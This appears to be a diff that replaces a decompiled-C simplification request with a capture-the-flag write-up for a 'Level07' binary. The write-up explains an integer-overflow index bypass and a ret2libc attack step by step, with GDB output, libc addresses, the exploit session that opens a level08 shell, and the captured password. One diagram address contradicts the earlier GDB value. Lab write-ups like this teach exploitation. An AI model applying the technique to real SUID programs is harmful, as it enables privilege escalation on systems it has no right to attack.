@@ -1,254 +1,416 @@
-make a simple and readable vesion of this code, do not change it, just simplify it:
-void clear_stdin(void)
-{
-  int iVar1;
+# Level07 — Integer Overflow & Arbitrary Memory Write Exploitation
 
-  do {
-    iVar1 = getchar();
-    if ((char)iVar1 == '\n') {
-      return;
+## Context
+
+Inside the home directory of the `level07` user, we find a binary named `level07`.
+The program implements a number storage service with store, read, and quit commands that manipulate an array of 100 integers.
+Our objective is to exploit an integer overflow vulnerability combined with missing bounds checking to achieve arbitrary memory writes and execute a ret2libc attack.
+
+---
+
+## Initial Environment — Directory Listing
+
+```bash
+$ ls -la
+total 17
+dr-xr-x---+ 1 level08 level08   80 Oct  2  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level08 level08  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level07 level07 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level08 users   8744 Sep 10  2016 level07
+-rw-r--r--  1 level08 level08  675 Sep 10  2016 .profile
+```
+
+> **Note:** the binary `level07` has the **SUID** bit set (`rws`), so it runs with the privileges of its owner (`level08`).
+
+---
+
+## Security Analysis
+
+```bash
+$ checksec --file ./level07
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   ./level07
+```
+
+**Key security features:**
+* **Partial RELRO** → GOT partially writable
+* **Stack canary** → Stack buffer overflow protection enabled
+* **NX disabled** → Stack is executable (shellcode possible but not needed)
+* **No PIE** → Predictable memory addresses for ret2libc
+
+---
+
+## Running the Binary
+
+```bash
+$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 42
+ Index: 5
+ Completed store command successfully
+
+Input command: read
+ Index: 5
+ Number at data[5] is 42
+
+Input command: quit
+```
+
+The program provides a simple interface to store and retrieve numbers from an array.
+
+Here's the vulnerable code:
+
+```c
+int tab[100];  // Array of 100 integers
+
+int store_number(int *tab) {
+    unsigned int index;
+    unsigned int input;
+    
+    printf(" Number: ");
+    input = get_unum();  // Get number from user
+    
+    printf(" Index: ");
+    index = get_unum();   // Get index from user
+    
+    if (index % 3 == 0 || (input >> 24) == 183) {
+        // Protection: can't use indices divisible by 3
+        puts(" *** ERROR! ***");
+        return 1;
     }
-  } while ((char)iVar1 != -1);
-  return;
+    
+    tab[index] = input;  // ⚠️ VULNERABILITY: No bounds check!
+    return 0;
 }
-undefined4 get_unum(void)
+```
 
-{
-  undefined4 local_10 [3];
-  
-  local_10[0] = 0;
-  fflush(stdout);
-  __isoc99_scanf(&DAT_08048ad0,local_10);
-  clear_stdin();
-  return local_10[0];
-}
+**The vulnerability:**
+- There's NO check that `index < 100`
+- We can write to ANY memory location relative to the array
+- The only protection is that indices divisible by 3 are blocked
+
+## The Attack Plan
+
+Our goal: Get a shell by exploiting this program to execute `system("/bin/sh")`.
+
+### Step 1: Find Where EIP Lives in Memory
+
+First, we need to determine what array index corresponds to the return address (EIP).
+
+**Using GDB to find the array base address:**
+
+```bash
+(gdb) b read_number
+Breakpoint 1 at 0x80486dd
+
+(gdb) r
+Input command: read
+
+Breakpoint 1, 0x080486dd in read_number ()
+
+(gdb) i r
+eax            0xffffd554    -10924
+ecx            0xffffd600    -10752
+edx            0xffffd600    -10752
+ebx            0xffffd554    -10924
+esp            0xffffd500    0xffffd500
+ebp            0xffffd528    0xffffd528
+esi            0xffffd6ec    -10516
+edi            0x8048d65    134516069
+eip            0x80486dd    0x80486dd <read_number+6>
+eflags         0x286    [ PF SF IF ]
+cs             0x23    35
+ss             0x2b    43
+ds             0x2b    43
+es             0x2b    43
+fs             0x0    0
+gs             0x63    99
+```
+
+This tells us:
+- `0xffffd554` is the actual address of `tab[0]` (the array start)
+
+**Finding the EIP address:**
+
+```bash
+(gdb) b *main+520
+Breakpoint 2 at 0x804892b
+
+(gdb) run
+Input command: read
+
+Breakpoint 2, 0x0804892b in main ()
+
+(gdb) i f
+Stack level 0, frame at 0xffffd620:
+ eip = 0x804892b in main; saved eip 0xf7e45513
+ ...
+ Saved registers:
+  eip at 0xffffd71c
+```
+
+This tells us:
+- The saved EIP (return address) is at `0xffffd71c`
+
+**Calculate the array index:**
+
+```
+Memory layout:
+0xffffd454: tab[0]      ← Start of array
+0xffffd458: tab[1]
+...
+0xffffd71c: EIP         ← Return address we want to overwrite
+
+Distance = 0xffffd71c - 0xffffd454 = 456 bytes
+Array index = 456 / 4 = 114
+```
+
+So `tab[114]` actually points to the return address!
 
 
+### Step 2: The Protection Problem
 
-void prog_timeout(void)
+Now we know that `tab[114]` is where we need to write, but there's a problem:
 
-{
-  code *pcVar1;
-  
-  pcVar1 = (code *)swi(0x80);
-  (*pcVar1)();
-  return;
-}
-
-
-
-undefined4 store_number(int param_1)
-
-{
-  uint uVar1;
-  uint uVar2;
-  undefined4 uVar3;
-  
-  printf(" Number: ");
-  uVar1 = get_unum();
-  printf(" Index: ");
-  uVar2 = get_unum();
-  if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
+```c
+if (index % 3 == 0 || (input >> 24) == 183) {
     puts(" *** ERROR! ***");
-    puts("   This index is reserved for wil!");
-    puts(" *** ERROR! ***");
-    uVar3 = 1;
-  }
-  else {
-    *(uint *)(uVar2 * 4 + param_1) = uVar1;
-    uVar3 = 0;
-  }
-  return uVar3;
+    return 1;
 }
+```
+
+Check if 114 is blocked:
+```
+114 % 3 = 0  ← Index 114 is divisible by 3, so it's BLOCKED!
+```
+
+We can't directly use index 114. We need to bypass this protection.
+
+---
+
+### Step 3: Integer Overflow Bypass
+
+We'll use **unsigned integer overflow** to bypass the protection check.
+
+#### Understanding Unsigned Integer Overflow
+
+In 32-bit systems:
+```
+Unsigned int range: 0 to 4,294,967,295 (UINT_MAX)
+
+When you exceed UINT_MAX, it wraps around:
+UINT_MAX + 1 = 0
+UINT_MAX + 2 = 1
+UINT_MAX + 3 = 2
+...
+```
+
+#### How Memory Addressing Works with Large Numbers
+
+When calculating memory addresses:
+```c
+tab[index] translates to: *(tab + index)
+
+Memory address = base_address + (index * sizeof(int))
+Memory address = base_address + (index * 4)
+```
+
+With a large index:
+```
+index = 1,073,741,938
+offset = 1,073,741,938 * 4 = 4,294,967,752 bytes
+
+But in 32-bit addressing, this wraps around:
+4,294,967,752 % 4,294,967,296 = 456 bytes
+
+So we end up at: base + 456 bytes
+Which is exactly where tab[114] is! (456 / 4 = 114)
+```
+---
+
+### Step 4: Setting Up Ret2libc
+
+Now we can write to `tab[114]` (the return address)! Let's set up a ret2libc attack.
+
+#### Finding the Addresses We Need
+
+We need to find:
+1. Address of `system()` function
+2. Address of "/bin/sh" string
+
+```bash
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+```
+
+So:
+- `system()` is at `0xf7e6aed0` (decimal: 4159090384)
+- "/bin/sh" is at `0xf7f897ec` (decimal: 4160264172)
+
+#### The Ret2libc Stack Layout
+
+We need to set up the stack to look like this:
+
+```
+┌──────────────────────┐
+│ tab[114]: system()   │ ← 0xf7e6aed0 (EIP will jump here)
+├──────────────────────┤
+│ tab[115]: dummy      │ ← "return address" for system()
+├──────────────────────┤
+│ tab[116]: "/bin/sh"  │ ← 0xf7f897ec (argument to system)
+└──────────────────────┘
+```
+
+#### Why Do We Skip tab[115]?
+
+This is an excellent question that relates to how function calls work at the assembly level!
+
+**Understanding Normal Function Calls**
+
+When you normally call a function like this:
+```c
+system("/bin/sh");
+```
+
+The compiler sets up the stack like this:
+
+```
+┌─────────────────────────┐
+│  argument: "/bin/sh"    │ ← Parameter to system()
+├─────────────────────────┤
+│  return address         │ ← Where to go AFTER system() finishes
+├─────────────────────────┤
+│  system() code starts   │ ← Function executes here
+└─────────────────────────┘
+```
+
+**What is tab[115]?**
+
+In our exploit:
+```
+tab[114] = 0xf7e6aed0     ← EIP points here (system function)
+tab[115] = ???            ← This becomes the "return address" FOR system()
+tab[116] = 0xf7f897ec     ← This is the argument to system()
+```
+
+When the vulnerable function returns:
+1. It pops the return address from the stack → jumps to **tab[114]** (system)
+2. Now `system()` thinks it was called normally
+3. `system()` looks for its return address at `[esp]` → finds **tab[115]**
+4. `system()` looks for its first argument at `[esp+4]` → finds **tab[116]** ("/bin/sh")
+
+**Visual Breakdown:**
+
+```
+Before 'quit' command:
+Stack Frame:
+┌──────────────────┐
+│  tab[114]        │ ← Return address of main()
+├──────────────────┤
+│  tab[115]        │ ← Random data
+├──────────────────┤  
+│  tab[116]        │ ← Random data
+└──────────────────┘
+
+After we overwrite:
+┌──────────────────┐
+│  0xf7e6aed0      │ ← system() address
+├──────────────────┤
+│  DUMMY           │ ← "return address" for system()
+├──────────────────┤
+│  0xf7f897ec      │ ← "/bin/sh" string address
+└──────────────────┘
+
+When 'quit' executes 'return':
+1. CPU: "Return to address at tab[114]" → Jumps to system()
+2. system() starts executing
+3. system(): "My return address is at [esp]" → tab[115] (doesn't use it yet)
+4. system(): "My first argument is at [esp+4]" → tab[116] = "/bin/sh"
+5. system() executes: system("/bin/sh") ✓
+6. We get a shell and can interact with it!
+```
+
+**Why We Don't Care About tab[115]:**
+
+We skip setting tab[115] to a meaningful value because:
+
+1. **We don't need it** - We just want to execute `system("/bin/sh")` and get a shell
+2. **system() won't return anyway** - Once we get a shell, we're interacting with it. The shell process takes over, so `system()` never returns to whatever address is in tab[115]
+3. **If system() DID return** - It would try to jump to whatever garbage value is in tab[115], likely causing a crash. But by then we already have our shell and have read the password file!
+
+**Example with a Real Return Address (optional):**
+
+If we wanted to be "clean" and return properly after system():
+
+```c
+tab[114] = system() address     // Execute system()
+tab[115] = exit() address       // After system(), call exit()
+tab[116] = "/bin/sh" address    // Argument for system()
+```
+
+This would:
+1. Call `system("/bin/sh")` 
+2. When you type `exit` in the shell
+3. Return to `exit()` function
+4. Program terminates cleanly
+
+But in exploitation, we typically don't care about clean exits!
+
+---
+
+### Step 5: Execute the Exploit
+
+Now we put it all together:
+
+```bash
+level07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384           # system() address in decimal
+ Index: 1073741938            # Really index 114, bypasses check
+ Completed store command successfully
+
+Input command: store
+ Number: 4160264172           # "/bin/sh" address in decimal
+ Index: 116                   # 116 % 3 = 2, allowed
+ Completed store command successfully
+
+Input command: quit           # Triggers return
+$ whoami                      # We got a shell!
+level08
+
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
 
 
 
-undefined4 read_number(int param_1)
+**Success:** Shell access with `level08` privileges and password extraction!
 
-{
-  int iVar1;
-  
-  printf(" Index: ");
-  iVar1 = get_unum();
-  printf(" Number at data[%u] is %u\n",iVar1,*(undefined4 *)(iVar1 * 4 + param_1));
-  return 0;
-}
-
-
-
-undefined4 main(undefined4 param_1,int *param_2,int *param_3)
-
-{
-  char cVar1;
-  byte bVar2;
-  int iVar3;
-  uint uVar4;
-  byte *pbVar5;
-  undefined4 *puVar6;
-  char *pcVar7;
-  byte *pbVar8;
-  int in_GS_OFFSET;
-  bool bVar9;
-  bool bVar10;
-  bool bVar11;
-  byte bVar12;
-  int *local_1c8;
-  int *local_1c4;
-  undefined4 local_1bc [100];
-  undefined4 local_2c;
-  byte local_28 [20];
-  int local_14;
-  
-  bVar12 = 0;
-  local_1c4 = param_2;
-  local_1c8 = param_3;
-  local_14 = *(int *)(in_GS_OFFSET + 0x14);
-  local_2c = 0;
-  local_28[0] = 0;
-  local_28[1] = 0;
-  local_28[2] = 0;
-  local_28[3] = 0;
-  local_28[4] = 0;
-  local_28[5] = 0;
-  local_28[6] = 0;
-  local_28[7] = 0;
-  local_28[8] = 0;
-  local_28[9] = 0;
-  local_28[10] = 0;
-  local_28[0xb] = 0;
-  local_28[0xc] = 0;
-  local_28[0xd] = 0;
-  local_28[0xe] = 0;
-  local_28[0xf] = 0;
-  local_28[0x10] = 0;
-  local_28[0x11] = 0;
-  local_28[0x12] = 0;
-  local_28[0x13] = 0;
-  puVar6 = local_1bc;
-  for (iVar3 = 100; iVar3 != 0; iVar3 = iVar3 + -1) {
-    *puVar6 = 0;
-    puVar6 = puVar6 + 1;
-  }
-  for (; *local_1c4 != 0; local_1c4 = local_1c4 + 1) {
-    uVar4 = 0xffffffff;
-    pcVar7 = (char *)*local_1c4;
-    do {
-      if (uVar4 == 0) break;
-      uVar4 = uVar4 - 1;
-      cVar1 = *pcVar7;
-      pcVar7 = pcVar7 + (uint)bVar12 * -2 + 1;
-    } while (cVar1 != '\0');
-    memset((void *)*local_1c4,0,~uVar4 - 1);
-  }
-  for (; *local_1c8 != 0; local_1c8 = local_1c8 + 1) {
-    uVar4 = 0xffffffff;
-    pcVar7 = (char *)*local_1c8;
-    do {
-      if (uVar4 == 0) break;
-      uVar4 = uVar4 - 1;
-      cVar1 = *pcVar7;
-      pcVar7 = pcVar7 + (uint)bVar12 * -2 + 1;
-    } while (cVar1 != '\0');
-    memset((void *)*local_1c8,0,~uVar4 - 1);
-  }
-  puts(
-      "----------------------------------------------------\n  Welcome to wil\'s crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------------------------\n"
-      );
-  do {
-    printf("Input command: ");
-    local_2c = 1;
-    fgets((char *)local_28,0x14,stdin);
-    uVar4 = 0xffffffff;
-    pbVar5 = local_28;
-    do {
-      if (uVar4 == 0) break;
-      uVar4 = uVar4 - 1;
-      bVar2 = *pbVar5;
-      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
-    } while (bVar2 != 0);
-    uVar4 = ~uVar4;
-    bVar9 = uVar4 == 1;
-    bVar11 = uVar4 == 2;
-    *(undefined1 *)((int)&local_2c + uVar4 + 2) = 0;
-    iVar3 = 5;
-    pbVar5 = local_28;
-    pbVar8 = (byte *)"store";
-    do {
-      if (iVar3 == 0) break;
-      iVar3 = iVar3 + -1;
-      bVar9 = *pbVar5 < *pbVar8;
-      bVar11 = *pbVar5 == *pbVar8;
-      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
-      pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
-    } while (bVar11);
-    bVar10 = false;
-    bVar9 = (!bVar9 && !bVar11) == bVar9;
-    if (bVar9) {
-      local_2c = store_number(local_1bc);
-    }
-    else {
-      iVar3 = 4;
-      pbVar5 = local_28;
-      pbVar8 = &DAT_08048d61;
-      do {
-        if (iVar3 == 0) break;
-        iVar3 = iVar3 + -1;
-        bVar10 = *pbVar5 < *pbVar8;
-        bVar9 = *pbVar5 == *pbVar8;
-        pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
-        pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
-      } while (bVar9);
-      bVar11 = false;
-      bVar9 = (!bVar10 && !bVar9) == bVar10;
-      if (bVar9) {
-        local_2c = read_number(local_1bc);
-      }
-      else {
-        iVar3 = 4;
-        pbVar5 = local_28;
-        pbVar8 = &DAT_08048d66;
-        do {
-          if (iVar3 == 0) break;
-          iVar3 = iVar3 + -1;
-          bVar11 = *pbVar5 < *pbVar8;
-          bVar9 = *pbVar5 == *pbVar8;
-          pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
-          pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
-        } while (bVar9);
-        if ((!bVar11 && !bVar9) == bVar11) {
-          if (local_14 == *(int *)(in_GS_OFFSET + 0x14)) {
-            return 0;
-          }
-                    // WARNING: Subroutine does not return
-          __stack_chk_fail();
-        }
-      }
-    }
-    if (local_2c == 0) {
-      printf(" Completed %s command successfully\n",local_28);
-    }
-    else {
-      printf(" Failed to do %s command\n",local_28);
-    }
-    local_28[0] = 0;
-    local_28[1] = 0;
-    local_28[2] = 0;
-    local_28[3] = 0;
-    local_28[4] = 0;
-    local_28[5] = 0;
-    local_28[6] = 0;
-    local_28[7] = 0;
-    local_28[8] = 0;
-    local_28[9] = 0;
-    local_28[10] = 0;
-    local_28[0xb] = 0;
-    local_28[0xc] = 0;
-    local_28[0xd] = 0;
-    local_28[0xe] = 0;
-    local_28[0xf] = 0;
-    local_28[0x10] = 0;
-    local_28[0x11] = 0;
-    local_28[0x12] = 0;
-    local_28[0x13] = 0;
-  } while( true );
-}
+---
